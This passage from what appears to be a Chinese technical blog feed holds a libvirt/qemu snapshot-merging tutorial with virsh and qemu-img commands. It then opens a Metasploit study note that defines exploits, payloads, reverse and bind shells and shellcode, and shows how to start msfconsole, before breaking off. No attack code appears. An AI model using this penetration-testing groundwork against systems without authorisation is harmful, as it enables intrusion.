d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>使用blockpull我们可以将snap-1/2/3中的数据合并至active层，最终rootbase将变成active的直接后端.</p><p>命令如下:</p><p>假设快照已经使用 创建Snapshots 小节中的方式完成:</p><p>如<em>Figure-5</em>中描述的-- <!-- -->[RootBase]<!-- --> &lt;- <!-- -->[Active]<!-- -->.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># virsh blockpull --domain RootBase  \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  --path /var/lib/libvirt/images/active.qcow2  \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  --base /var/lib/libvirt/images/RootBase.qcow2  \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  --wait --verbose</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>后续的工作是我们需要使用virsh来清理掉不用的快照</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># virsh snapshot-delete --domain RootBase Snap-3 --metadata</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># virsh snapshot-delete --domain RootBase Snap-2 --metadata</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># virsh snapshot-delete --domain RootBase Snap-1 --metadata</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Figure-6</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.------------.  .------------.  .------------.  .------------.  .------------.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|            |  |            |  |            |  |            |  |            |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| RootBase   &lt;---  Snap-1    &lt;---  Snap-2    &lt;---  Snap-3    &lt;---  Snap-4    |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|            |  |            |  |            |  |            |  | (Active)   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'------------'  '------------'  '------------'  '------------'  '------------'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      |                  |              |                  \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      |                  |              |                   \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      |                  |              |                    \  stream data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      |                  |              | stream data         \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      |                  |              |                      \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      |                  | stream data  |                       \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      |  stream data     |              '------------------&gt;     v</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      |                  |                                    .--------------.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      |                  '---------------------------------&gt;  |              |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      |                                                       |  Snap-4      |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      '----------------------------------------------------&gt;  | (Active)     |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                                              '--------------'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                                                'Standalone'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                                                (w/o backing</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                                                file)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>上图表示的是将所有backing file全部合并至active</p><p>如下执行命令:</p><p>(1) 在我们执行合并 <em>之前</em> 查看一下快照的大小(注意观察'Active'):
::</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">        # ls -lash /var/lib/libvirt/images/RootBase.img</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        608M -rw-r--r--. 1 qemu qemu 1.0G Oct 11 17:54 /var/lib/libvirt/images/RootBase.img</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        # ls -lash /var/lib/libvirt/images/*Snap*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        840K -rw-------. 1 qemu qemu 896K Oct 11 17:56 /var/lib/libvirt/images/Snap-1.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        392K -rw-------. 1 qemu qemu 448K Oct 11 17:56 /var/lib/libvirt/images/Snap-2.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        456K -rw-------. 1 qemu qemu 512K Oct 11 17:56 /var/lib/libvirt/images/Snap-3.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        2.9M -rw-------. 1 qemu qemu 3.0M Oct 11 18:10 /var/lib/libvirt/images/Active.qcow2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>(2) 单独检查下 'Active' 所指向的backing file ::</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">        # qemu-img info /var/lib/libvirt/images/Active.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        image: /var/lib/libvirt/images/Active.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        file format: qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        virtual size: 1.0G (1073741824 bytes)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        disk size: 2.9M</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        cluster_size: 65536</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        backing file: /var/lib/libvirt/images/Snap-3.qcow2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>(3) 开始 <strong>blockpull</strong> 操作.
::</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">        # virsh blockpull --domain ptest2-base --path /var/lib/libvirt/images/Active.qcow2 --wait --verbose</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Block Pull: [100 %]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Pull complete</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>(4) 再检查下快照大小， 'Active'变得很大
::</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">        # ls -lash /var/lib/libvirt/images/*Snap*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         840K -rw-------. 1 qemu qemu 896K Oct 11 17:56 /var/lib/libvirt/images/Snap-1.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         392K -rw-------. 1 qemu qemu 448K Oct 11 17:56 /var/lib/libvirt/images/Snap-2.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         456K -rw-------. 1 qemu qemu 512K Oct 11 17:56 /var/lib/libvirt/images/Snap-3.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        1011M -rw-------. 1 qemu qemu 3.0M Oct 11 18:29 /var/lib/libvirt/images/Active.qcow2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>(5) 检查'Active'信息，现在它已经不需要backing file了，正如<em>Figure-6</em>所示::</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">        # qemu-img info /var/lib/libvirt/images/Active.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        image: /var/lib/libvirt/images/Active.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        file format: qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        virtual size: 1.0G (1073741824 bytes)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        disk size: 1.0G</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        cluster_size: 65536</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>(6) 清理现场
::</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">        # virsh snapshot-delete --domain RootBase Snap-3 --metadata</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>(7) 现在还可以使用下 guestfish  <strong>READ-ONLY</strong>  模式来检查下磁盘内容( <em>--ro</em> 选项)
::</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">        # guestfish --ro -i -a /var/lib/libvirt/images/Active.qcow2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>快照删除 (and 'offline commit')</p><p>删除（live/offline）状态的<em>内置快照</em>很方便 ::</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># virsh snapshot-delete --domain f17vm --snapshotname snap6</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>[OR]</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># virsh snapshot-delete f17vm snap6</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>libvirt现在还没有删除外置快照的功能，但是可以使用<em>qemu-img</em>命令来完成.</p><p>比如我们有这样一条链(VM<em>offline</em>状态): base &lt;- sn1 &lt;- sn2 &lt;- sn3</p><p>现在删除第二个快照(sn2).有两种方式:</p><ul><li>Method (1): base &lt;- sn1 &lt;- sn3 (by copying sn2 into sn1)</li><li>Method (2): base &lt;- sn1 &lt;- sn3 (by copying sn2 into sn3)</li></ul><p>Method (1)</p><p>(by copying sn2 into sn1)</p><p>注意: 必须保证sn1没有被其他快照作为后端,不然就挂了!!</p><p>offline commit</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># qemu-img commit sn2.qcow2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>将会<em>commit</em>所有在sn2中的改动到sn2的backing file(sn1).
qemu-img commit和virsh blockcommit类似
现在把sn3的后端指向到sn1.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># qemu-img rebase -u -b sn1.qcow2 sn3.qcow2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>注意: -u代表'Unsafe mode' -- 此模式下仅仅修改了指向到的backing file名字，必须谨慎操作.
现在可以直接删除sn2</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># rm sn2.qcow2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Method (2)</p><p>(by copying sn2 into sn3)</p><p>合并数据，rebase后端:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># qemu-img rebase -b sn1.qcow2 sn3.qcow2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>未使用-u模式的rebase将把数据也一并合并过去，即sn2的数据写入到sn3.
换言之: 这里使用的'Safe mode',也是默认模式 --对sn3而言任何从
qemu-img rebase(没有-u)和和virsh blockpull类似.
backingfile（sn1）到旧的backingfile（sn2）之间发生的差异改动都将被合并到sn3中.</p><p>现在可以删除sn2了</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># rm sn2.qcow2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content>
        <category label="libvirt" term="libvirt"/>
        <category label="kvm" term="kvm"/>
        <category label="snapshot" term="snapshot"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[metasploit学习笔记]]></title>
        <id>/2012/11/12/msf-study-note</id>
        <link href="https://itxx00.github.io/notes/blog/2012/11/12/msf-study-note"/>
        <updated>2012-11-12T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[msf study note]]></summary>
        <content type="html"><![CDATA[<blockquote><p>N年前使用metasploit框架过程中写下的学习笔记</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="一名词解释">一．名词解释<a class="hash-link" href="#一名词解释" title="标题的直接链接">​</a></h2><ul><li><p>exploit: 测试者利用它来攻击一个系统，程序，或服务，以获得开发者意料之外的结果。常见的 有内存溢出，网站程序漏洞利用，配置错误exploit。</p></li><li><p>payload: 我们想让被攻击系统执行的程序，如reverse shell可以从目标机器与测试者之间建立一 个反响连接，bind shell 绑定一个执行命令的通道至测试者的机器。payload也可以是只 能在目标机器上执行有限命令的程序。</p></li><li><p>shellcode: 是进行攻击时的一系列被当作payload的指令，通常在目标机器上执行之后提供一个可 执行命令的shell。</p></li><li><p>module: MSF的模块，由一系列代码组成。</p></li><li><p>listener: 等待来自被攻击机器的incoming连接的监听在测试者机器上的程序。</p></li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="二msf基础">二．MSF基础<a class="hash-link" href="#二msf基础" title="标题的直接链接">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="启动msf">启动msf<a class="hash-link" href="#启动msf" title="标题的直接链接">​</a></h3><p>1、MSF提供多种用户界面：控制台模式（msfconsole），命令行模式（msfcli），图形模式（msfgui、armitage），（在老版本中还有web界面模式，后来貌似由于安全因素被取消了？）其中console模式最常用，启动方式：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd /opt/framework/msf3/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfconsole</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>运行此命令后将进入msf命令提示符：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="获取帮助信息">获取帮助信息<a class="hash-link" href="#获取帮助信息" title="标题的直接链接">​</a></h3><p>2、获取命令的帮助信息：help</p><p>例子：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">help connect</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 